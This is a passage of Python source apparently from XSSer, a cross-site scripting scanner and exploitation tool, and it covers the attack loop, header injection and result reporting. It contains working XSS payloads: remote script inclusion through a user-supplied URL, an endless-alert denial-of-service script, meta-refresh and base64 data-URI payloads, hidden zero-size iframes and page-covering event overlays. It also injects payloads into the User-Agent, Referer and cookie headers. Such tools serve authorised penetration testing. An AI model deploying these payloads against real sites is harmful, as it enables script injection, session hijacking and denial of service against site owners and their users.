            if not self.options.target:
                self.report('='*75)
                self.report(str(p.version))
                self.report('='*75)
                self.report("[XST Attack!] checking for HTTP TRACE method ...")
                self.report('='*75)
            self.check_trace()

        nthreads = max(1, abs(options.threads))
        nworkers = len(self.pool.workers)
        if nthreads != nworkers:
            if nthreads < nworkers:
                self.pool.dismissWorkers(nworkers-nthreads)
            else:
                self.pool.createWorkers(nthreads-nworkers)

        for reporter in self._reporters:
            reporter.report_state('scanning')
        
        # step 1: get urls
        urls = self.try_running(self._get_attack_urls, "\n[Error] Internal error getting -targets-")
        for reporter in self._reporters:
            reporter.report_state('arming')
        
        # step 2: get payloads
        payloads = self.try_running(self.get_payloads, "\n[Error] Internal error getting -payloads-")
        for reporter in self._reporters:
            reporter.report_state('cloaking')
        if options.Dwo:
            payloads = self.process_payloads_ipfuzzing(payloads)
        elif options.Doo:
            payloads = self.process_payloads_ipfuzzing_octal(payloads)

        for reporter in self._reporters:
            reporter.report_state('locking targets')
        
        # step 3: get query string
        query_string = self.try_running(self.get_query_string, "\n[Error] Internal error getting query -string-")

        # step 4: print curl options if requested
        if options.verbose:
            Curl.print_options()

        for reporter in self._reporters:
            reporter.report_state('sanitize')
        urls = self.sanitize_urls(urls)

        for reporter in self._reporters:
            reporter.report_state('attack')

        # step 5: perform attack
        self.try_running(self.attack, "\n[Error] Internal problems running attack: ", (urls, payloads, query_string))

        for reporter in self._reporters:
            reporter.report_state('reporting')

        if len(self.final_attacks):
            self.report("Waiting for tokens to arrive")
        while self._ongoing_requests and not self._landing:
            if not self.pool:
                self.mothership.poll_workers()
            else:
                self.poll_workers()
            time.sleep(0.2)
            for reporter in self._reporters:
                reporter.report_state('final sweep..')
        print("="*75 + "\n")
        if self.pool:
            self.pool.dismissWorkers(len(self.pool.workers))
            self.pool.joinAllDismissedWorkers()
        start = time.time()
        while not self._landing and len(self.final_attacks) and time.time() - start < 5.0:
            time.sleep(0.2)
            for reporter in self._reporters:
                reporter.report_state('landing.. '+str(int(5.0 - (time.time() - start))))
        if self.final_attacks:
            self.report("Forcing a reverse connection XSSer will certify that your target is 100% vulnerable\n")
            for final_attack in self.final_attacks.itervalues():
                if not final_attack['url'] == None:
                    self.report("Connecting from:", final_attack['url'] , "\n")
                self.report(",".join(self.successfull_urls) , "is connecting remotely to XSSer... You have it! ;-)", "\n")
                self.report("="*50 + "\n")
        for reporter in self._reporters:
            reporter.end_attack()
        if self.mothership:
            self.mothership.remove_reporter(self)
            print("="*75 + "\n")
            self.report("Mosquito(es) landed!\n")
        else:
            self.report("Mosquito(es) landed!")
        self.print_results()

    def sanitize_urls(self, urls):
        all_urls = set()
        if urls is not None:
            for url in urls:
                if url.startswith("http://") or url.startswith("https://"):
                    self.urlspoll.append(url)
                    all_urls.add(url)
                else:
                    self.report("\nThis target: (" + url + ") is not a correct url [DISCARDED]\n")
                    url = None
        else:
            print "\n[Info] Not any valid source provided to start a test... Aborting!\n"
        return all_urls

    def land(self, join=False):
        self._landing = True
        if self.hub:
            self.hub.shutdown()
            if join:
                self.hub.join()
                self.hub = None

    def _prepare_extra_attacks(self, payload):
        """
        Setup extra attacks.
        """
        agents = [] # user-agents
        try:
            f = open("core/fuzzing/user-agents.txt").readlines() # set path for user-agents
        except:
            f = open("fuzzing/user-agents.txt").readlines() # set path for user-agents when testing
        for line in f:
            agents.append(line)
        agent = random.choice(agents).strip() # set random user-agent
        referer = "127.0.0.1"
        options = self.options
        cookie = None
        if 'PAYLOAD' in payload['payload']: # auto
            if options.xsa:
                hashing = self.generate_hash('xsa')
                agent = payload['payload'].replace('PAYLOAD', hashing)
                self._ongoing_attacks['xsa'] = hashing
                self.xsa_injection = self.xsa_injection + 1
            else:
                if options.agent:
                    agent = options.agent
            if options.xsr:
                hashing = self.generate_hash('xsr')
                referer = payload['payload'].replace('PAYLOAD', hashing)
                self._ongoing_attacks['xsr'] = hashing
                self.xsr_injection = self.xsr_injection + 1
            else:
                if options.referer:
                    referer = options.referer
            if options.coo:
                hashing = self.generate_hash('cookie')
                cookie = payload['payload'].replace('PAYLOAD', hashing)
                self._ongoing_attacks['cookie'] = hashing
                self.coo_injection = self.coo_injection + 1
        elif 'XSS' in payload['payload']: # manual
            if options.xsa:
                hashing = self.generate_hash('xsa')
                agent = payload['payload'].replace('XSS', hashing)
                self._ongoing_attacks['xsa'] = hashing
                self.xsa_injection = self.xsa_injection + 1
            else:
                if options.agent:
                    agent = options.agent
            if options.xsr:
                hashing = self.generate_hash('xsr')
                referer = payload['payload'].replace('XSS', hashing)
                self._ongoing_attacks['xsr'] = hashing
                self.xsr_injection = self.xsr_injection + 1
            else:
                if options.referer:
                    referer = options.referer
            if options.coo:
                hashing = self.generate_hash('cookie')
                cookie = payload['payload'].replace('XSS', hashing)
                self._ongoing_attacks['cookie'] = hashing
                self.coo_injection = self.coo_injection + 1
        elif '1' in payload['payload']: # manual
            if options.xsa:
                hashing = self.generate_numeric_hash()
                agent = payload['payload'].replace('1', hashing)
                self._ongoing_attacks['xsa'] = hashing
                self.xsa_injection = self.xsa_injection + 1
            else:
                if options.agent:
                    agent = options.agent
            if options.xsr:
                hashing = self.generate_numeric_hash()
                referer = payload['payload'].replace('1', hashing)
                self._ongoing_attacks['xsr'] = hashing
                self.xsr_injection = self.xsr_injection + 1
            else:
                if options.referer:
                    referer = options.referer
            if options.coo:
                hashing = self.generate_numeric_hash()
                cookie = payload['payload'].replace('1', hashing)
                self._ongoing_attacks['cookie'] = hashing
                self.coo_injection = self.coo_injection + 1
        else: # default
            if options.xsa:
                hashing = self.generate_hash('xsa')
                agent = "<script>alert('" + hashing + "')</script>"
                self._ongoing_attacks['xsa'] = hashing
                self.xsa_injection = self.xsa_injection + 1
            else:
                if options.agent:
                    agent = options.agent
            if options.xsr:
                hashing = self.generate_hash('xsr')
                referer = "<script>alert('" + hashing + "')</script>"
                self._ongoing_attacks['xsr'] = hashing
                self.xsr_injection = self.xsr_injection + 1
            else:
                if options.referer:
                    referer = options.referer
            if options.coo:
                hashing = self.generate_hash('cookie')
                cookie = "<script>alert('" + hashing + "')</script>"
                self._ongoing_attacks['cookie'] = hashing
                self.coo_injection = self.coo_injection + 1
        return agent, referer, cookie

    def attack(self, urls, payloads, query_string):
        """
        Perform an attack on the given urls with the provided payloads and
        query_string.
        """
        for url in urls:
            if self.pool:
                self.poll_workers()
            else:
                self.mothership.poll_workers()
            if not self._landing:
                self.attack_url(url, payloads, query_string)

    def generate_real_attack_url(self, dest_url, description, method, hashing, query_string, payload, orig_url):
        """
        Generate a real attack url by using data from a successfull test.

	This method also applies DOM stealth mechanisms.
        """
        user_attack_payload = payload['payload']
        if self.options.finalpayload:
            user_attack_payload = self.options.finalpayload
        elif self.options.finalremote:
            user_attack_payload = '<script src="' + self.options.finalremote + '"></script>'
        elif self.options.finalpayload or self.options.finalremote and payload["browser"] == "[Data Control Protocol Injection]":
            user_attack_payload = '<a href="data:text/html;base64,' + b64encode(self.options.finalpayload) + '></a>'
        elif self.options.finalpayload or self.options.finalremote and payload["browser"] == "[Induced Injection]":
            user_attack_payload = self.options.finalpayload
        if self.options.dos:
            user_attack_payload = '<script>for(;;)alert("You were XSSed!!");</script>'
        if self.options.doss:
            user_attack_payload = '<meta%20http-equiv="refresh"%20content="0;">'
        if self.options.b64:
            user_attack_payload = '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4">'
        if self.options.onm:
            user_attack_payload = '"style="position:absolute;top:0;left:0;z-index:1000;width:3000px;height:3000px" onMouseMove="' + user_attack_payload
        if self.options.ifr:
            user_attack_payload = '<iframe src="' + user_attack_payload + '" width="0" height="0"></iframe>'
		    
        do_anchor_payload = self.options.anchor
        anchor_data = None
        attack_hash = None
        if 'PAYLOAD' in payload['payload']:
            if user_attack_payload == "":
                attack_hash = self.generate_hash('final')
                user_attack_payload = payload['payload']
                user_attack_payload = payload['payload'].replace('PAYLOAD', attack_hash)
            else:
                user_attack_payload = payload['payload'].replace('PAYLOAD', user_attack_payload)
        if 'XSS' in user_attack_payload:
            attack_hash = self.generate_hash('final')
            user_attack_payload = user_attack_payload.replace('XSS', attack_hash)
        if do_anchor_payload:
            dest_url, newhash = self.get_url_payload(orig_url, payload, query_string, user_attack_payload)
            dest_url = dest_url.replace('?', '#')
        else:
            dest_url, newhash = self.get_url_payload(orig_url, payload, query_string, user_attack_payload)
        if attack_hash:
            self.final_attacks[attack_hash] = {'url':dest_url}
        return dest_url

    def token_arrived(self, attack_hash):
        if not self.mothership:
            # only the mothership calls on token arriving.
            self.final_attack_callback(attack_hash)

    def final_attack_callback(self, attack_hash):
        if attack_hash in self.final_attacks:
            dest_url = self.final_attacks[attack_hash]['url']
            self.report('[*] Browser check:', dest_url)
            for reporter in self._reporters:
                reporter.add_checked(dest_url)
            if self._reporter:
                from twisted.internet import reactor
                reactor.callFromThread(self._reporter.post, 'SUCCESS ' + dest_url)
            self.final_attacks.pop(attack_hash)

    def apply_postprocessing(self, dest_url, description, method, hashing, query_string, payload, orig_url):
        real_attack_url = self.generate_real_attack_url(dest_url, description, method, hashing, query_string, payload, orig_url)
        #generate_shorturls = self.options.shorturls
        #if generate_shorturls:
        #    shortener = ShortURLReservations(self.options.shorturls)
        #    if self.options.finalpayload or self.options.finalremote or self.options.b64 or self.options.dos:
        #        shorturl = shortener.process_url(real_attack_url)
        #        self.report("[/] Shortered URL (Final Attack):", shorturl)
        #    else:
        #        shorturl = shortener.process_url(dest_url)
        #        self.report("[/] Shortered URL (Injection):", shorturl)
        return real_attack_url

    def report(self, *args):
        args = list(map(lambda s: str(s), args))
        formatted = " ".join(args)
        if not self.options.silent:
            print(formatted)
        for reporter in self._reporters:
            reporter.post(formatted)

    def print_results(self):
        """
        Print results from attack.
        """
        self.report('\n' + '='*75)
        total_injections = len(self.hash_found) + len(self.hash_notfound)
        if len(self.hash_found) + len(self.hash_notfound) == 0:
            pass
        else:
            self.report("[*] Final Results:")
            self.report('='*75 + '\n')
            self.report("- Injections:", total_injections)
            self.report("- Failed:", len(self.hash_notfound))
            self.report("- Successful:", len(self.hash_found))
            try:
                _accur = len(self.hash_found) * 100 / total_injections
            except ZeroDivisionError:
                _accur = 0
            self.report("- Accur: %s %%\n" % _accur)
            if not len(self.hash_found) and self.hash_notfound:
                self.report('='*75 + '\n')
                pass
            else:
                self.report('='*75)
                self.report("[*] List of possible XSS injections:")
                self.report('='*75 + '\n')
        for line in self.hash_found: 
            attack_url = self.apply_postprocessing(line[0], line[1], line[2], line[3], line[4], line[5], line[6])
            if self.options.fileoutput:
                fout = open("XSSreport.raw", "a")
            if line[2] == "xsr":
                self.xsr_found = self.xsr_found + 1
                xsr_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]  
                if xsr_vulnerable_host[0]["payload"] == line[4] and xsr_vulnerable_host[0]["target"] == line[6] and self.xsr_found > 1:
                    self.xsr_found = self.xsr_found - 1
                    pass
                else:
                    self.report("[I] Target:", line[6])
                    self.report("[+] Injection:",str(line[6])+"/"+str(line[4]), "[", Curl.referer, "]")
                    self.report("[!] Special:", "This injection looks like a Cross Site Referer Scripting")
                    self.report("[-] Method:", line[2])
                    self.report('-'*50, "\n")
                    if self.options.fileoutput:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Injection: " + str(line[6])+"/"+str(line[4]) + "[" + str(Curl.referer) + "]" + "\n")
                        fout.write("[!] Special: " + "This injections looks like a Cross Site Referer Scripting" + "\n")
                        fout.write("[-] Method: " + line[2] + "\n" + '-'*50 +"\n")
            elif line[2] == "xsa":
                self.xsa_found = self.xsa_found + 1
                xsa_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]
                if xsa_vulnerable_host[0]["payload"] == line[4] and xsa_vulnerable_host[0]["target"] == line[6] and self.xsa_found > 1:
                    self.xsa_found = self.xsa_found - 1
                    pass
                else:
                    self.report("[I] Target:", line[6])
                    self.report("[+] Injection:",str(line[6])+"/"+str(line[4]),
                                "[",  Curl.agent, "]")
                    self.report("[!] Special:", "This injection looks like a Cross Site Agent Scripting")
                    self.report("[-] Method:", line[2])
                    self.report('-'*50, "\n")
                    if self.options.fileoutput:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Injection: "+ str(line[6])+"/"+str(line[4]) + "[" + str(Curl.agent) + "]" + "\n")
                        fout.write("[!] Special: " + "This injection looks like a Cross Site Agent Scripting " + "\n")
                        fout.write("[-] Method: " + line[2] + "\n" + '-'*50 +"\n")
            elif line[2] == "coo":
                self.coo_found = self.coo_found + 1
                coo_vulnerable_host = [{"payload":str(line[4]), "target":str(line[6])}]
                if coo_vulnerable_host[0]["payload"] == line[4] and coo_vulnerable_host[0]["target"] == line[6] and self.coo_found > 1:
                    self.coo_found = self.coo_found - 1
                    pass
                else:
                    self.report("[I] Target:", line[6])
                    self.report("[+] Injection:",str(line[6])+"/"+str(line[4]),"[",
                                Curl.cookie, "]")
                    self.report("[!] Special:", "This injection looks like a Cross Site Cookie Scripting")
                    self.report("[-] Method:", line[2])
                    self.report('-'*50, "\n")
                    if self.options.fileoutput:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Injection: "+ str(line[6])+"/"+str(line[4]) + "[" + str(Curl.cookie) + "]" + "\n")
                        fout.write("[!] Special: " + "This injection looks like a Cross Site Cookie Scripting " + "\n")
                        fout.write("[-] Method: " + line[2] + "\n" + '-'*50 +"\n")
            elif line[1] == "[Data Control Protocol Injection]":
                self.dcp_found = self.dcp_found + 1
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", str(line[6])+"/"+str(line[4]),
                            "[", line[5]["payload"] , "]")
                self.report("[!] Special:", "This injection looks like a Data Control Protocol flaw")
                if self.options.finalpayload or self.options.finalremote:
                    self.report("[*] Final Attack: ", attack_url)
                else:
                    self.report("[*] Final Attack: ", line[5]["payload"])
                self.report("[-] Method: dcp")
                self.report('-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: " + str(line[6]) + "/" + str(line[4]) + "[" + line[5]["payload"] + "]" + "\n")
                    fout.write("[!] Special: " + "This injection looks like a Data Control Protocol flaw" + "\n")
                    if self.options.finalpayload or self.options.finalremote:
                        fout.write("[*] Final Attack: " + attack_url + "\n")
                    else:
                        fout.write("[*] Final Attack: " + line[5]["payload"] + "\n")
                    fout.write("[-] Method: dcp" + "\n" + '-'*50 +"\n")
            elif line[1] == "[Document Object Model Injection]":
                self.dom_found = self.dom_found + 1 
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", str(line[0]))
                self.report("[!] Special:", "This injection looks like a Document Object Model flaw")
                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                    self.report("[*] Final Attack: ", attack_url)
                else:
                    pass
                self.report("[-] Method: dom")
                self.report('-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n") 
                    fout.write("[+] Injection: " + str(line[0]) + "\n")
                    fout.write("[!] Special: " + "This injection looks like a Document Object Model flaw" + "\n")
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        fout.write("[*] Final Attack: " + attack_url + "\n")
                    else:
                        pass
                    fout.write("[-] Method: dom" + "\n" + '-'*50 +"\n")

            elif line[1] == "[Induced Injection]":
                self.httpsr_found = self.httpsr_found +1
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", str(line[0]))
                self.report("[!] Special:", "This injection looks like a HTTP Splitting Response")
                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                    self.report("[*] Final Attack: ", attack_url)
                else:
                    pass
                self.report("[-] Method: ind")
                self.report('-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: " + str(line[0]) + "\n")
                    fout.write("[!] Special: " + "This injection looks like a HTTP Splitting Response" + "\n")
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        fout.write("[*] Final Attack: " + attack_url + "\n")
                    else:
                        pass
                    fout.write("[-] Method: ind" + "\n" + '-'*50 +"\n")
            elif line[5]["browser"] == "[hashed_precheck_system]":    
                self.false_positives = self.false_positives + 1
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", str(line[0]))
                self.report("[!] Checker: This injection looks like a -false positive- result!. Verify it manually!")
                self.report("[-] Method: hash")
                self.report('-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: " + str(line[0]) + "\n")
                    fout.write("[!] Checker: This injection looks like a -false positive- result!. Verify it manually!" + "\n")
                    fout.write("[-] Method: hash" + "\n" + '-'*50 +"\n")
            elif line[5]["browser"] == "[manual_injection]":
                self.manual_found = self.manual_found + 1
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", str(line[0]))
                self.report("[-] Method: manual")
                self.report('-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: " + str(line[0]) + "\n")
                    fout.write("[-] Method: manual" + "\n" + '-'*50 +"\n")
            elif line[5]["browser"] == "[Heuristic test]":
                if str(line[5]["payload"]).strip('XSS') == "\\" or str(line[5]["payload"]).strip('XSS') == "/" or str(line[5]["payload"]).strip('XSS') == ">" or str(line[5]["payload"]).strip('XSS') == "<" or str(line[5]["payload"]).strip('XSS') == ";" or str(line[5]["payload"]).strip('XSS') == "'" or str(line[5]["payload"]).strip('XSS') == '"' or str(line[5]["payload"]).strip('XSS') == "=":
                    self.report("[I] Target:", line[6])
                    self.report("[+] Parameter(s):", "[",
                                str(line[5]["payload"]).strip('XSS') , "]")
                    self.report("[!] Special:", "This parameter(s) looks like is NOT -completly- FILTERED on target code")
                    self.report("[-] Method: heuristic")
                    self.report('-'*50, "\n")
                    if self.options.fileoutput:
                        fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                        fout.write("---------------------" + "\n")
                        fout.write("[I] Target: " + line[6] + "\n")
                        fout.write("[+] Parameter(s): " + "[" + str(line[5]["payload"]).strip('XSS') + "]" + "\n")
                        fout.write("[!] Special: " + "This parameter(s) looks like is NOT -completly- FILTERED on target code" + "\n")
                        fout.write("[-] Method: heuristic" + "\n" + '-'*50 +"\n")
                else:
                    pass
            else:
                self.auto_found = self.auto_found + 1
                self.report("[I] Target:", line[6])
                self.report("[+] Injection:", line[0])
                if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                    self.report("[*] Final Attack: ", attack_url)
                else:
                    pass
                self.report("[-] Method: xss")
                self.report("[-] Browsers:", line[1],  "\n", '-'*50, "\n")
                if self.options.fileoutput:
                    fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                    fout.write("---------------------" + "\n")
                    fout.write("[I] Target: " + line[6] + "\n")
                    fout.write("[+] Injection: " + line[0] + "\n")
                    if self.options.finalpayload or self.options.finalremote or self.options.doss or self.options.dos or self.options.b64:
                        fout.write("[*] Final Attack: " +  attack_url + "\n")
                    else:
                        pass
                    fout.write("[-] Method: xss" + "\n")
                    fout.write("[-] Browsers: "+ line[1] +  "\n" + '-'*50 + "\n")

            #if self.options.tweet:
            #    self.report("[!] Trying to publish on: " + self.sn_service + "/" + self.sn_username)
            #    if self.options.fileoutput:
            #        fout.write("[!] Published on: " + self.sn_service + "/" + self.sn_username + "\n")
            #        fout.write("="*75 + "\n")

            #if self.options.launch_browser:
            #    if self.options.dcp:
            #        #XXX implement DCP autolauncher
            #        self.report("\n[@] DCP autolauncher not implemented, yet. (http://docs.python.org/library/webbrowser.html)")
            #        self.report("[!] Aborting all launching process!!. If you want to 'auto-launch' other results, try without --Dcp option\n")
            #        self.report("[I] If you have some DCP success injections discovered, try to open -manually- these results in the website of your target. You will see that works! ;)\n")
            #    else:
            #        if attack_url == "":
            #            pass
            #        else:
            #            self._webbrowser.open(attack_url)

        # heuristic always with statistics
        if self.options.heuristic:
            self.options.statistics = True
	# some statistics reports
        if self.options.statistics:
            # heuristic test results
            if self.options.heuristic:
                self.report('='*75)
                self.report("[*] Heuristic:")
                self.report('='*75)
                self.report('-'*50)
                self.report('  ', "    <not-filt>", "   <filtered>", "    =" , "    ASCII",
                            "   +", "   UNE/HEX", "   +", "   DEC")
                # semicolon results
                heuris_semicolon_total_found = self.heuris_semicolon_notfound + self.heuris_une_semicolon_found + self.heuris_dec_semicolon_found
                self.report('; ',   "       ", self.heuris_semicolon_found, "            ", heuris_semicolon_total_found, "               ",
                            self.heuris_semicolon_notfound, "            ",
                            self.heuris_une_semicolon_found, "           ",
                            self.heuris_dec_semicolon_found)
                # backslash results
                heuris_backslash_total_found = self.heuris_backslash_notfound + self.heuris_une_backslash_found + self.heuris_dec_backslash_found
                self.report('\\ ',  "       ", self.heuris_backslash_found, "            ", heuris_backslash_total_found, "               ",
                            self.heuris_backslash_notfound, "            ",
                            self.heuris_une_backslash_found, "           ",
                            self.heuris_dec_backslash_found)
                # slash results
                heuris_slash_total_found = self.heuris_slash_notfound + self.heuris_une_slash_found + self.heuris_dec_slash_found
                self.report("/ ",   "       ", self.heuris_slash_found, "            ",
                            heuris_slash_total_found, "               ",
                            self.heuris_slash_notfound, "            ",
                            self.heuris_une_slash_found, "           ",
                            self.heuris_dec_slash_found)
                # minor results
                heuris_minor_total_found = self.heuris_minor_notfound + self.heuris_une_minor_found + self.heuris_dec_minor_found
                self.report("< ",   "       ", self.heuris_minor_found, "            ",
                            heuris_minor_total_found, "               ",
                            self.heuris_minor_notfound, "            ",
                            self.heuris_une_minor_found, "           ",
                            self.heuris_dec_minor_found)
                # mayor results
                heuris_mayor_total_found = self.heuris_mayor_notfound + self.heuris_une_mayor_found + self.heuris_dec_mayor_found
                self.report("> ",   "       ", self.heuris_mayor_found, "            ",
                            heuris_mayor_total_found, "               ",
                            self.heuris_mayor_notfound, "            ",
                            self.heuris_une_mayor_found, "           ",
                            self.heuris_dec_mayor_found)
                # doublecolon results
                heuris_doublecolon_total_found = self.heuris_doublecolon_notfound + self.heuris_une_doublecolon_found + self.heuris_dec_doublecolon_found
                self.report('" ',   "       ", self.heuris_doublecolon_found, "            ", heuris_doublecolon_total_found, "               ",
                            self.heuris_doublecolon_notfound, "            ",
                            self.heuris_une_doublecolon_found, "           ",
                            self.heuris_dec_doublecolon_found)
                # colon results
                heuris_colon_total_found = self.heuris_colon_notfound + self.heuris_une_colon_found + self.heuris_dec_colon_found
                self.report("' ",   "       ", self.heuris_colon_found, "            ",
                            heuris_colon_total_found, "               ",
                            self.heuris_colon_notfound, "            ",
                            self.heuris_une_colon_found, "           ",
                            self.heuris_dec_colon_found)
                # equal results
                heuris_equal_total_found = self.heuris_equal_notfound + self.heuris_une_equal_found + self.heuris_dec_equal_found
                self.report("= ",   "       ", self.heuris_equal_found, "            ",
                            heuris_equal_total_found, "               ",
                            self.heuris_equal_notfound, "            ",
                            self.heuris_une_equal_found, "           ",
                            self.heuris_dec_equal_found)
                self.report('-'*70)
                total_heuris_found = heuris_semicolon_total_found + heuris_backslash_total_found + heuris_slash_total_found + heuris_minor_total_found + heuris_mayor_total_found + heuris_doublecolon_total_found + heuris_colon_total_found + heuris_equal_total_found
                
                total_heuris_params = total_heuris_found + self.heuris_semicolon_found + self.heuris_backslash_found + self.heuris_slash_found + self.heuris_minor_found + self.heuris_mayor_found + self.heuris_doublecolon_found + self.heuris_colon_found + self.heuris_equal_found
                try:
                    _accur = total_heuris_found * 100 / total_heuris_params
                except ZeroDivisionError:
                    _accur = 0
                self.report('Target(s) Filtering Accur: %s %%' % _accur)
                self.report('-'*70)
            # statistics block
            if len(self.hash_found) + len(self.hash_notfound) == 0:
                pass
            else:
                self.report('='*75)
                self.report("[*] Statistic:")
                self.report('='*75)
                test_time = datetime.datetime.now() - self.time
                self.report('-'*50)
                self.report("Test Time Duration: ", test_time)
                self.report('-'*50  )
                total_connections = self.success_connection + self.not_connection + self.forwarded_connection + self.other_connection
                self.report("Total Connections:", total_connections)
                self.report('-'*25)
                self.report("200-OK:" , self.success_connection , "|",  "404:" ,
                            self.not_connection , "|" , "503:" ,
                            self.forwarded_connection , "|" , "Others:",
                            self.other_connection)
                try:
                    _accur = self.success_connection * 100 / total_connections
                except ZeroDivisionError:
                    _accur = 0
                self.report("Connec: %s %%" % _accur)
                self.report('-'*50)
                total_payloads = self.check_positives + self.manual_injection + self.auto_injection + self.dcp_injection + self.dom_injection + self.xsa_injection + self.xsr_injection + self.coo_injection 
                self.report("Total Payloads:", total_payloads)
                self.report('-'*25)
                self.report("Checker:", self.check_positives,  "|", "Manual:",
                            self.manual_injection, "|" , "Auto:" ,
                            self.auto_injection ,"|", "DCP:",
                            self.dcp_injection, "|", "DOM:", self.dom_injection,
                            "|", "Induced:", self.httpsr_injection, "|" , "XSR:",
                            self.xsr_injection, "|", "XSA:",
                            self.xsa_injection , "|", "COO:",
                            self.coo_injection)
                self.report('-'*50)
                self.report("Total Injections:" , 
                            len(self.hash_notfound) + len(self.hash_found))
                self.report('-'*25)
                self.report("Failed:" , len(self.hash_notfound), "|",
                            "Successful:" , len(self.hash_found))
                try:
                    _accur = len(self.hash_found) * 100 / total_injections
                except ZeroDivisionError:
                    _accur = 0
                self.report("Accur : %s %%" % _accur)
                self.report('-'*25)
                total_discovered = self.false_positives + self.manual_found + self.auto_found + self.dcp_found + self.dom_found + self.xsr_found + self.xsa_found + self.coo_found
                self.report("Total Discovered:", total_discovered)
                self.report('-'*25)
                self.report("Checker:", self.false_positives, "|",
                            "Manual:",self.manual_found, "|", "Auto:",
                            self.auto_found, "|", "DCP:", self.dcp_found,
                            "|", "DOM:", self.dom_found, "|", "Induced:",
                            self.httpsr_found, "|" , "XSR:", self.xsr_found,
                            "|", "XSA:", self.xsa_found, "|", "COO:",
                            self.coo_found)
                self.report('-'*50)
                self.report("False positives:", self.false_positives, "|",
                            "Vulnerables:",
                            total_discovered - self.false_positives)
                self.report('-'*25)
	        # efficiency ranking:
	        # algor= vulnerables + false positives - failed * extras
                mana = 0
                if self.hash_found > 3:
                    mana = mana + 4500
                if self.hash_found == 1:
                    mana = mana + 500
                if self.options.reversecheck:
                    mana = mana + 200
                if total_payloads > 100:
                    mana = mana + 150
                if not self.options.xsser_gtk:
                    mana = mana + 125
                if self.options.discode:
                    mana = mana + 100
                if self.options.proxy:
                    mana = mana + 100
                if self.options.threads > 9:
                    mana = mana + 100
                if self.options.heuristic:
                    mana = mana + 100
                if self.options.finalpayload or self.options.finalremote:
                    mana = mana + 100
                if self.options.script:
                    mana = mana + 100
                if self.options.Cem or self.options.Doo:
                    mana = mana + 75
                if self.options.heuristic:
                    mana = mana + 50
                if self.options.script and not self.options.fuzz:
                    mana = mana + 25
                if self.options.followred and self.options.fli:
                    mana = mana + 25
                if self.options.wizard:
                    mana = mana + 25
                if self.options.dcp:
                    mana = mana + 25
                if self.options.hash:
                    mana = mana + 10
                mana = (len(self.hash_found) * mana) + mana -4500
                # enjoy it :)
                self.report("Mana:", mana)
                self.report("-"*50)

        c = Curl()
        if not len(self.hash_found) and self.hash_notfound:
            if self.options.hash:
                self.report("[!] Checker: looks like your target doesn't repeat code received.\n")
                if self.options.fuzz or self.options.dcp or self.options.script:
                    self.report("[I] Could not find any vulnerability!. Try another combination or hack it -manually- :)\n")
            else:
                self.report("[I] Could not find any vulnerability!. Try another combination or hack it -manually- :)\n")
            self.report('='*75 + '\n')
            if self.options.fileoutput:
                fout = open("XSSreport.raw", "a")
                fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                fout.write("---------------------" + "\n")
                fout.write("[!] Not reported 'positive' results for: \n" + "[-] " + str('\n[-] '.join([u[0] for u in self.hash_notfound])) + "\n")
                fout.write("="*75 + "\n")
                fout.close()
        else:
            # some exits and info for some bad situations:
            if len(self.hash_found) + len(self.hash_notfound) == 0 and not Exception:
                self.report("\nXSSer cannot send data :( ... maybe is -something- blocking our connections!?\n")
            if len(self.hash_found) + len(self.hash_notfound) == 0 and self.options.crawling:
                self.report("\n[Error] Crawlering system is not receiving feedback... Aborting! :(\n")

        # print results to xml file
        if self.options.filexml:
            xml_report_results = xml_reporting(self)
            try:
                xml_report_results.print_xml_results(self.options.filexml)
            except:
                return

if __name__ == "__main__":
    app = xsser()
    options = app.create_options()
    if options:
        app.set_options(options)
        app.run()
    app.land(True)
